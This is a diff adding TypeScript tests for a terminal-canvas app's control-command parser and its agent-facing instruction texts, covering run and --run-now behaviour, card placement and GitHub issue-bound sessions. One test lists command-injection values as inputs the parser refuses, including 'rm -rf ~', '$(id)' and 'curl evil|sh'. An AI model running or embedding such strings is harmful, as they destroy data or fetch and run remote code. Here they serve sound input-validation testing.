@@ -77,6 +77,108 @@ describe('parseControlRequest', () => {
     })
   })
 
+  it('run requires --node (#925)', () => {
+    expect(parseControlRequest('run', {})).toEqual({ error: 'run requires --node <id>' })
+    expect(parseControlRequest('run', { node: 'n1' })).toEqual({ verb: 'run', args: { node: 'n1' } })
+  })
+
+  it('both bodies document the run verb with --project (#925)', () => {
+    for (const [name, body] of [
+      ['skill', buildCanvasSkillBody('/x/shim.sh')],
+      ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+    ] as const) {
+      expect(body, name).toMatch(/- `run --node <id> \[--project <id>\]`/)
+      expect(body, name).toMatch(/twin of the\s+node'?s Run now button/)
+      expect(body, name).toMatch(/nothing queued is refused/)
+    }
+  })
+
+  it('both bodies document --run-now: headless start, reply shape, closed-tab exception (#925)', () => {
+    for (const [name, body] of [
+      ['skill', buildCanvasSkillBody('/x/shim.sh')],
+      ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+    ] as const) {
+      expect(body, name).toMatch(/`--run-now`/)
+      expect(body, name).toMatch(/LAST on the line/)
+      expect(body, name).toContain('`--run-now=1`')
+      expect(body, name).toContain('startedIds')
+      expect(body, name).toMatch(/tab restored\s+\(not\s+switched\s+to\)/)
+      expect(body, name).toMatch(/`--run-now` cannot be\s+combined with `--after`/)
+      expect(body, name).toMatch(/keeps its Run now/)
+      // The pre-existing contract survives next to the new flag.
+      expect(body, name).toMatch(/not reopened/i)
+      expect(body, name).toMatch(/starts when the user next views/)
+      expect(body, name).not.toMatch(/without switching/)
+    }
+  })
+
+  // The `=1` form is NOT position-free: the pre-2026-08-15 shim loop (still on an SSH host that has
+  // not reconnected) takes the token after any `--flag` as its value, so `--run-now=1 --agent claude`
+  // becomes `arg.run-now=1=--agent` and loses `--agent`. Last on the line works in either form
+  // there (control-shim-parse.test.ts runs that old loop). The old text offered `=1` as an
+  // alternative to "last", which is the claim that broke.
+  it('both bodies say --run-now goes LAST in either form, and why (#925 final review)', () => {
+    for (const [name, body] of [
+      ['skill', buildCanvasSkillBody('/x/shim.sh')],
+      ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+    ] as const) {
+      expect(body, name).toMatch(/Put it LAST on the line,\s+in either form \(`--run-now` or `--run-now=1`\)/)
+      expect(body, name).toMatch(/older shim can still sit on an SSH host/)
+      expect(body, name).toMatch(/mid-line either form\s+swallows the flag after it/)
+      expect(body, name).not.toMatch(/or write `--run-now=1`/)
+    }
+  })
+
+  it('both bodies list [--run-now] on every open verb and say run needs verified identity (#925 final review)', () => {
+    for (const [name, body] of [
+      ['skill', buildCanvasSkillBody('/x/shim.sh')],
+      ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+    ] as const) {
+      for (const verb of ['open-terminal', 'open-claude', 'open-agent']) {
+        // The verb's signature line: the first line naming it, the same finder the --project
+        // walker below uses.
+        const line = body.split('\n').find((l) => l.includes(`\`${verb} `))
+        expect(line, `${name}: ${verb} signature`).toContain('[--run-now]')
+      }
+      // `run` joined requiresVerified: a legacy-token caller is refused ('Run refused.').
+      const entry = body.slice(body.indexOf('- `run --node'), body.indexOf('- `color --node'))
+      expect(entry, name).toMatch(/`run` requires verified node\s+identity/)
+    }
+  })
+
+  it('both bodies state the run / --run-now edges the implementation actually has (#925)', () => {
+    for (const [name, body] of [
+      ['skill', buildCanvasSkillBody('/x/shim.sh')],
+      ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+    ] as const) {
+      // `run` skips an `--after` wait only off screen or on a mounted node: an on-screen node whose
+      // terminal is not mounted, armed or failed, is refused — the mount will not fire it.
+      expect(body, name).toContain('`run-not-mounted`')
+      expect(body, name).not.toMatch(/and it skips an `--after` wait/)
+      // An SSH project's node cannot start headless: it stays queued with that reason, and only
+      // while its project is off screen. `startHeadless` refuses before any claim, so the launch
+      // is untouched — a plain one starts on view, an armed or failed one still waits (review
+      // fix 1: "which starts when the user views it" over-promised for those two).
+      expect(body, name).toContain('`remote-unsupported`')
+      expect(body, name).toMatch(/while that project is not on\s+screen/)
+      expect(body, name).toMatch(/left exactly as it\s+was/)
+      expect(body, name).toMatch(/armed or failed one still\s+needs its wait or Run now/)
+      expect(body, name).not.toMatch(/which starts when the user views it/)
+      // The closed-tab restore has two exceptions in the code (Canvas.tsx startNodesHeadlessRef): an SSH
+      // project, and no project open (the welcome screen). The claim must not read as universal.
+      expect(body, name).toMatch(/tab restored\s+\(not\s+switched\s+to\), except for an SSH\s+project or when\s+no\s+project is open/)
+      // `list` prints STARTING while a headless start is in flight, and says not to run it again.
+      expect(body, name).toMatch(/`list` names QUEUED, STARTING,/)
+      expect(body, name).toMatch(/STARTING means a background start is in flight/)
+      // The Server Edition: --run-now changes nothing ELSE there (the --after refusal still
+      // applies — review ruling 3), and `run` is creator-owned.
+      expect(body, name).toMatch(
+        /On the Server\s+Edition `--run-now` changes\s+nothing else \(opens start at once; the\s+`--after`\s+refusal still\s+applies\)/
+      )
+      expect(body, name).toMatch(/`run` reaches only\s+nodes you opened during this server run/)
+    }
+  })
+
   it('requires a source for show verbs', () => {
     expect(parseControlRequest('show-video', {})).toEqual({ error: 'show-video requires --path' })
     expect(parseControlRequest('show-web', {})).toEqual({
@@ -251,6 +353,22 @@ describe('parseControlRequest', () => {
     expect(body.toLowerCase()).toContain('confirm')
   })
 
+  // `assign` with no `--before` used to append at the bottom of the column — a card an agent had
+  // just moved into a long Done column read as gone. It now lands at the TOP, and an agent reading
+  // either body must be told so (a doc that still says "end" is a stale contract).
+  it('both agent-facing texts say an unanchored assign lands at the TOP of the column', () => {
+    for (const body of [buildCanvasSkillBody('/x/shim.sh'), buildCanvasControlInstructions('/tmp/nodeterm.sh')]) {
+      // Anchored on the verb's own synopsis (`assign --node <id>`), not on the first mention of
+      // `assign --node`: the issue-bound contract, rendered earlier in both bodies, also tells a
+      // session to run `assign --node "$NODETERM_NODE_ID" …`.
+      const at = body.indexOf('assign --node <id>')
+      expect(at).toBeGreaterThan(-1)
+      const assign = body.slice(at, at + 900)
+      expect(assign).toMatch(/[Ww]ithout `--before`[^.]*\bTOP\b/)
+      expect(assign).not.toMatch(/\bat the end\b|\bappend/i)
+    }
+  })
+
   // The parser change in this commit's sibling is only half a fix: an agent that never learns the
   // `=` form simply cannot express a value beginning with `--`, and the failure stays silent for it.
   // So both agent-facing texts must carry the rule, not just one of them.
@@ -300,10 +418,11 @@ describe('parseControlRequest', () => {
     expect(parseControlRequest('reply', { node: 'n1' })).toEqual({ error: 'reply requires --text' })
   })
 
-  it('the shim maps a bare positional onto arg.node for color/send/reply/sticky too', () => {
-    // The positional list is a case pattern inside CONTROL_SHIM_SCRIPT; send/reply/sticky take the
-    // same "first bare word is the node" convenience write/close/rename/color/branch already have.
-    expect(CONTROL_SHIM_SCRIPT).toContain('write|close|rename|color|branch|send|reply|sticky)')
+  it('the shim maps a bare positional onto arg.node for color/send/reply/sticky/run too', () => {
+    // The positional list is a case pattern inside CONTROL_SHIM_SCRIPT; send/reply/sticky/run take
+    // the same "first bare word is the node" convenience write/close/rename/color/branch already
+    // have (run joined for #925; control-shim-parse.test.ts runs it through a real sh).
+    expect(CONTROL_SHIM_SCRIPT).toContain('write|close|rename|color|branch|send|reply|sticky|run)')
   })
 
   it('sticky requires --node plus exactly one of --text/--append, and is not destructive', () => {
@@ -328,6 +447,8 @@ describe('parseControlRequest', () => {
       args: { node: 'n1', text: '' }
     })
     expect(isDestructiveVerb('sticky')).toBe(false)
+    // #925: `run` starts a queued launch; it is verified-only, not confirm-gated.
+    expect(isDestructiveVerb('run')).toBe(false)
   })
 
   it('both agent-facing texts warn that --prompt is one line and must not start with a slash', () => {
@@ -980,5 +1101,105 @@ describe('link project boundary guidance', () => {
       expect(body).toContain('node not found in this project; cross-project linking is not supported')
       expect(body).toContain('This does not reveal whether the id exists in another project.')
     }
+  })
+})
+
+describe('trigger wording does not claim in-process subagent requests (issue #917)', () => {
+  const bodies: [string, string][] = [
+    ['skill', buildCanvasSkillBody('/x/shim.sh')],
+    ['instructions', buildCanvasControlInstructions('/x/shim.sh')]
+  ]
+
+  it('both bodies route on visible canvas work, and say background subagents are not it', () => {
+    for (const [name, body] of bodies) {
+      // "subagents" / "delegate to other agents" also describe Claude Code's own Agent tool, so a
+      // request for background subagents was routed into opening canvas nodes instead.
+      expect(body, name).not.toMatch(/subagents\/agents/)
+      expect(body, name).not.toMatch(/delegate parts of a task/)
+      expect(body, name).toMatch(/separate, visible canvas sessions or\s+worktrees/)
+      expect(body, name).toMatch(/in-process/)
+    }
+  })
+
+  it('the orchestration recipe leaves the fan-out size to step 0', () => {
+    const skill = buildCanvasSkillBody('/x/shim.sh')
+    expect(skill).not.toMatch(/2–5 independent workstreams/)
+    expect(skill).toMatch(/independent workstreams step 0 identified/)
+  })
+})
+
+describe('--issue: GitHub issue-bound sessions', () => {
+  it('accepts owner/repo#N and #N on the two agent-open verbs', () => {
+    expect(parseControlRequest('open-agent', { agent: 'claude', issue: 'eneskirca/nodeterm#42' })).toEqual({
+      verb: 'open-agent',
+      args: { agent: 'claude', issue: 'eneskirca/nodeterm#42' }
+    })
+    expect(parseControlRequest('open-claude', { issue: '#7' })).toMatchObject({ verb: 'open-claude' })
+  })
+
+  it.each([
+    'o/r#1; rm -rf ~',
+    'o/r#`id`',
+    'o/r#$(id)',
+    '$(id)/r#1',
+    'o/r#1\nrm -rf ~',
+    '#1 && curl evil|sh',
+    'o/r',
+    ''
+  ])('refuses a hostile or malformed reference %j before any shell sees it', (issue) => {
+    const r = parseControlRequest('open-agent', { agent: 'claude', issue })
+    expect(r).toHaveProperty('error')
+    expect((r as { error: string }).error).toMatch(/^open-agent: --issue must be/)
+  })
+
+  it('refuses --issue on a verb that cannot read an issue, rather than silently ignoring it', () => {
+    expect(parseControlRequest('open-terminal', { issue: '#1' })).toEqual({
+      error: 'open-terminal: --issue applies only to open-agent / open-claude (an agent session reads the issue itself)'
+    })
+    expect(parseControlRequest('assign', { node: 'n1', issue: '#1' })).toHaveProperty('error')
+  })
+
+  // The skill and the marker block are what an agent actually reads. Walk BOTH, and red on any
+  // clause of the contract that goes missing — a doc line with no test is a plan, not a fact.
+  const bodies: Array<[string, string]> = [
+    ['skill body', buildCanvasSkillBody('/x/nodeterm.sh')],
+    ['instructions block', buildCanvasControlInstructions('/x/nodeterm.sh')]
+  ]
+
+  it.each(bodies)('%s documents the flag on both open verbs', (_name, body) => {
+    expect(body).toMatch(/open-claude [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+    expect(body).toMatch(/open-agent --agent [^\n]*\[--issue <owner\/repo#N \| #N>\]/)
+  })
+
+  it.each(bodies)('%s states the reference-only launch prompt, rendered from the real composer', (_name, body) => {
+    expect(body).toContain('carries ONLY the reference, never the issue\'s')
+    expect(body).toContain('You are working on GitHub issue owner/repo#123.')
+    expect(body).toContain('gh issue view 123 --repo owner/repo --comments')
+    expect(body).toMatch(/with no repository configured it is\s+refused/)
+    // A board start (and a bare `--issue` open) means WORK ON IT; a `--prompt` replaces the task.
+    const flat = body.replace(/\s+/g, ' ')
+    expect(flat).toContain('Then work on it: investigate, plan and implement the fix in this working tree.')
+    expect(flat).toContain('`--prompt` REPLACES that task')
+    expect(flat).toContain('the issue IS your task: read it, then investigate, plan and implement the fix')
+    // The rendered example is the real prompt, limits included.
+    expect(flat).toContain('Never close the issue. Do not post issue comments or open pull requests unless the user asks')
+  })
+
+  it.each(bodies)('%s pins the status + write-back contract', (_name, body) => {
+    const flat = body.replace(/\s+/g, ' ')
+    expect(flat).toContain('assign --node "$NODETERM_NODE_ID" --column "In Progress"')
+    expect(flat).toContain('--column "In Review"')
+    expect(flat).toContain('never Done')
+    expect(flat).toContain('Never close the GitHub issue and never move a card to Done: done stays human.')
+    expect(flat).toContain('Closes #N')
+    expect(flat).toContain('Posting to GitHub is outward-facing and PUBLIC.')
+    expect(flat).toContain('ONLY when the user asked for it in this session')
+    expect(flat).toContain('otherwise end with a proposed comment the user can post')
+    expect(flat).toContain('The end of a turn moves nothing')
+  })
+
+  it.each(bodies)('%s never promises an automatic post to GitHub', (_name, body) => {
+    expect(body).not.toMatch(/automatically (post|comment|close)/i)
+    expect(body).not.toMatch(/nodeterm (posts|comments|closes)/i)
   })
 })
